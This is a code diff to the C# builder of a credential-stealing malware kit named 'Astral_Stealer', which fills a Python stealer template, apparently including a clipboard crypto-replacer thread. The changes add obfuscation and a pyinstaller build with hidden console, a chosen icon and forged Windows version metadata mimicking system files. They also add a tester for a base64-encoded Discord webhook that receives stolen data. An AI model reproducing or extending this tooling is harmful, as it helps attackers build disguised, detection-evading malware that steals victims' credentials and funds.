@@ -1,6 +1,8 @@
 ﻿using System;
 using System.Diagnostics;
+using System.Drawing;
 using System.IO;
+using System.Net.Http;
 using System.Text;
 using System.Windows.Forms;
 
@@ -8,6 +10,7 @@ namespace Astral_Stealer
 {
     public partial class Form1 : Form
     {
+        private string exeFileName = "output";
         private string pythonCodeTemplate = @"import asyncio
 import sys
 import json
@@ -3128,7 +3131,6 @@ if __name__ == ""__main__"" and os.name == ""nt"":
     autoo = threading.Thread(target=Replacer_Loop().run)
     autoo.start()";
 
-
         public Form1()
         {
             InitializeComponent();
@@ -3138,6 +3140,7 @@ if __name__ == ""__main__"" and os.name == ""nt"":
         {
             try
             {
+                string baseFileName = ExeNameOutput.Text;
                 string pythonCode = pythonCodeTemplate;
 
                 pythonCode = ReplaceOptionValue(pythonCode, "PC_CREATOR", Environment.UserName);
@@ -3172,18 +3175,18 @@ if __name__ == ""__main__"" and os.name == ""nt"":
                 pythonCode = ReplaceOptionValue(pythonCode, "_Found_Launcher", _Found_Launcher.Checked ? "yes" : "no");
                 pythonCode = ReplaceOptionValue(pythonCode, "Crypto_Options", Crypto_Options.Checked ? "yes" : "no");
 
-                File.WriteAllText("output.py", pythonCode);
+                File.WriteAllText($"{baseFileName}.py", pythonCode);
 
                 // Si la case à cocher encryption est cochée, exécuter la commande d'obfuscation
                 if (encryption.Checked)
                 {
-                    string outputFilePath = $"obfuscated_output.py"; // Renommer le fichier de sortie
+                    string obfuscatedFilePath = $"{baseFileName}_obfuscated.py"; // Renommer le fichier de sortie
 
                     // Exécuter la commande Python d'obfuscation avec ProcessStartInfo
                     ProcessStartInfo psiEncrypt = new ProcessStartInfo
                     {
                         FileName = "python",
-                        Arguments = $"./Astral_assets/obfuscation/obfuscation.py -r -i output.py -o {outputFilePath} -s 100",
+                        Arguments = $"./Astral_assets/obfuscation/obfuscation.py -r -i {baseFileName}.py -o {obfuscatedFilePath} -s 100",
                         UseShellExecute = false,
                         CreateNoWindow = false
                     };
@@ -3192,26 +3195,25 @@ if __name__ == ""__main__"" and os.name == ""nt"":
                     {
                         processEncrypt.WaitForExit();
                     }
+
+                    // Utiliser le fichier obfuscé pour la compilation
+                    baseFileName = $"{baseFileName}_obfuscated";
                 }
 
                 // Si la case à cocher compil est cochée, exécuter la commande de compilation
                 if (compil.Checked)
                 {
-                    string filename = "output"; // Nom du fichier à compiler
-                    if (encryption.Checked)
-                    {
-                        filename = "obfuscated_output"; // Utiliser le fichier encrypté pour la compilation
-                    }
                     string hideOption = "";
+                    string icon = LinkToIcon.Text; // Utiliser le lien vers l'icône entré dans le champ de texte
 
                     // Définir les options en fonction de l'état des cases à cocher
                     if (Hide_Options.Checked)
                     {
-                        hideOption = " --noconsole";
+                        hideOption = "--noconsole";
                     }
 
                     // Exécuter la commande de compilation
-                    string command = $"pyinstaller --onefile {hideOption} {filename}.py";
+                    string command = $"pyinstaller --onefile --name {baseFileName} --version-file=./Astral_assets/version/version.txt {hideOption} -i \"{icon}\" {baseFileName}.py";
 
                     // Exécuter la commande avec ProcessStartInfo
                     ProcessStartInfo psiCompile = new ProcessStartInfo
@@ -3227,21 +3229,21 @@ if __name__ == ""__main__"" and os.name == ""nt"":
                         processCompile.WaitForExit();
                     }
 
-                    MessageBox.Show("Compilation terminée avec succès !", "Succès", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                    MessageBox.Show("Compilation completed successfully!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                 }
 
-                MessageBox.Show("Script Python généré avec succès !", "Succès", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                MessageBox.Show("Python script generated successfully!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
             }
             catch (Exception ex)
             {
-                MessageBox.Show($"Erreur lors de la génération du script Python : {ex.Message}", "Erreur", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show($"Error generating Python script: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
         }
 
-
-        private string ReplaceOptionValue(string pythonCode, string placeholder, string value)
+        // Méthode pour remplacer une valeur dans le template de code Python
+        private string ReplaceOptionValue(string template, string option, string value)
         {
-            return pythonCode.Replace($"%{placeholder}%", value);
+            return template.Replace($"{{{{ {option} }}}}", value);
         }
 
         private void build_script_Click(object sender, EventArgs e)
@@ -3482,7 +3484,7 @@ if __name__ == ""__main__"" and os.name == ""nt"":
         {
             try
             {
-                string url = "https://discord.com/users/le_chat_blanc666.";
+                string url = "https://discord.gg/DjpfZ9hUwY";
 
                 ProcessStartInfo psi = new ProcessStartInfo
                 {
@@ -3539,6 +3541,133 @@ if __name__ == ""__main__"" and os.name == ""nt"":
                 Console.WriteLine($"Error: {ex.Message}");
                 MessageBox.Show($"Error: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
+        }
+
+        private async void TestWebhook_Click(object sender, EventArgs e)
+        {
+            string webhookUrl = Encoding.UTF8.GetString(Convert.FromBase64String(B64_WBH_STR.Text));
+            string message = "{\"content\":\"Your Webhook is working successfully ✅\"}";
+
+            using (HttpClient client = new HttpClient())
+            {
+                var content = new StringContent(message, Encoding.UTF8, "application/json");
+
+                try
+                {
+                    HttpResponseMessage response = await client.PostAsync(webhookUrl, content);
+                    response.EnsureSuccessStatusCode();
+                    TestWebhook.FillColor = Color.Green; // Change button color to green
+                    MessageBox.Show("Message sent successfully!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                }
+                catch (Exception ex)
+                {
+                    TestWebhook.FillColor = Color.Red; // Change button color to red
+                    MessageBox.Show($"Error sending message: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+            }
+        }
+
+        private void UpdateVersionFile()
+        {
+            try
+            {
+                string filePath = @"Astral_assets\version\version.txt";
+                string versionInfo = $@"
+VSVersionInfo(
+  ffi=FixedFileInfo(
+    filevers=(6, 1, 7601, 17514),
+    prodvers=(6, 1, 7601, 17514),
+    mask=0x3f,
+    flags=0x0,
+    OS=0x40004,
+    fileType=0x1,
+    subtype=0x0,
+    date=(0, 0)
+    ),
+  kids=[
+    StringFileInfo(
+      [
+      StringTable(
+        u'040904B0',
+        [StringStruct(u'CompanyName', u'{CompanyName.Text}'),
+        StringStruct(u'FileDescription', u'{FileDescription.Text}'),
+        StringStruct(u'FileVersion', u'{FileVersion.Text}'),
+        StringStruct(u'InternalName', u'{InternalName.Text}'),
+        StringStruct(u'InternalName', u'{InternalName2.Text}'),
+        StringStruct(u'OriginalFilename', u'{OriginalFilename.Text}'),
+        StringStruct(u'ProductName', u'{ProductName.Text}'),
+        StringStruct(u'ProductVersion', u'{ProductVersion.Text}')])
+      ]), 
+    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
+  ]
+)";
+                File.WriteAllText(filePath, versionInfo);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show($"Error updating version file: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+
+        private void CompanyName_TextChanged(object sender, EventArgs e)
+        {
+            UpdateVersionFile();
+        }
+
+        private void FileDescription_TextChanged(object sender, EventArgs e)
+        {
+            UpdateVersionFile();
+        }
+
+        private void FileVersion_TextChanged(object sender, EventArgs e)
+        {
+            UpdateVersionFile();
+        }
+
+        private void InternalName_TextChanged(object sender, EventArgs e)
+        {
+            UpdateVersionFile();
+        }
+
+        private void InternalName2_TextChanged(object sender, EventArgs e)
+        {
+            UpdateVersionFile();
+        }
+
+        private void OriginalFilename_TextChanged(object sender, EventArgs e)
+        {
+            UpdateVersionFile();
+        }
+
+        private void ProductName_TextChanged(object sender, EventArgs e)
+        {
+            UpdateVersionFile();
+        }
+
+        private void ProductVersion_TextChanged(object sender, EventArgs e)
+        {
+            UpdateVersionFile();
+        }
+
+        private void LinkToIcon_TextChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void IconSelector_Click(object sender, EventArgs e)
+        {
+            OpenFileDialog openFileDialog = new OpenFileDialog();
+            openFileDialog.Filter = "Icon Files (*.ico)|*.ico"; // Filtrer pour ne montrer que les fichiers .ico
+
+            if (openFileDialog.ShowDialog() == DialogResult.OK)
+            {
+                LinkToIcon.Text = openFileDialog.FileName; // Mettre à jour le champ de texte avec le chemin de l'icône sélectionnée
+            }
+        }
+
+        private void ExeNameOutput_TextChanged(object sender, EventArgs e)
+        {
+            exeFileName = ExeNameOutput.Text;
         }
     }
 }
